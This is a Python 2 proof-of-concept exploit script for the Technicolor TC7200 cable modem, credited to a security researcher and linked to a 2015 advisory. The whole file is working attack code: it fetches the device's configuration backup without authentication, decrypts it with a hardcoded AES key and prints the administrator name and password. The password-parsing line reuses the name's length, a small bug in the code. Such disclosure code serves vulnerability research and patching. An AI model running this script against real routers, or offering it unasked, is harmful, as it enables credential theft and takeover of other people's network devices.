#
# POC code for Technicolor TC7200
#
# Demonstrates the following vulnerabilities
#  - Unauthenticated backup file access
#  - Backup file decryption
#
# Credit: Gergely Eberhardt (@ebux25) from SEARCH-LAB Ltd. (www.search-lab.hu)
#
# Advisory: http://www.search-lab.hu/advisories/secadv-20150720

import sys
import requests
import struct
import binascii
from Crypto.Cipher import AES

class technicolor:
    def __init__(self, addr, port):
        self.addr = addr
        self.port = port
        self.s = requests.Session()

    def getUri(self, uri):
        return 'http://%s:%d/%s'%(self.addr,self.port,uri)

    def downloadBackupFile(self):
        r = self.s.get(self.getUri('goform/system/GatewaySettings.bin'))
        resp = ''
        for chunk in r:
            resp += chunk
        return resp

    def parseBackup(self, backup):
        p = backup.find('MLog')
        if (p > 0):
            p += 6
            nh = struct.unpack('!H',backup[p:p+2])[0]
            name = backup[p+2:p+2+nh]
            p += 2+nh
            ph = struct.unpack('!H',backup[p:p+2])[0]
            pwd = backup[p+2:p+2+nh]
            return (name,pwd)
        return ('','')

    def decryptBackup(self, backup):
        key = binascii.unhexlify('000102030405060708090A0B0C0D0E0F101112131415161718191A1B1C1D1E1F')
        l = (len(backup)/16)*16
        cipher = AES.new(key, AES.MODE_ECB, '\x00'*(16))
        plain = cipher.decrypt(backup[0:l])
        return plain


#------------------------------------

if (len(sys.argv) < 2):
    print 'technicolor_tc7200_poc.py addr [port]'
addr = sys.argv[1]
port = 80
if (len(sys.argv) == 3):
    port = int(sys.argv[2])

# create technicolor object
t = technicolor(addr, port)

backup = t.downloadBackupFile()
if (len(backup) > 0):
    open('test.enc', 'wb').write(backup)
    plain = t.decryptBackup(backup)
    open('test.dec', 'wb').write(plain)

    (name, pwd) = t.parseBackup(plain)
    if (name != ''):
        print 'admin name: %s, pwd: %s'%(name,pwd)
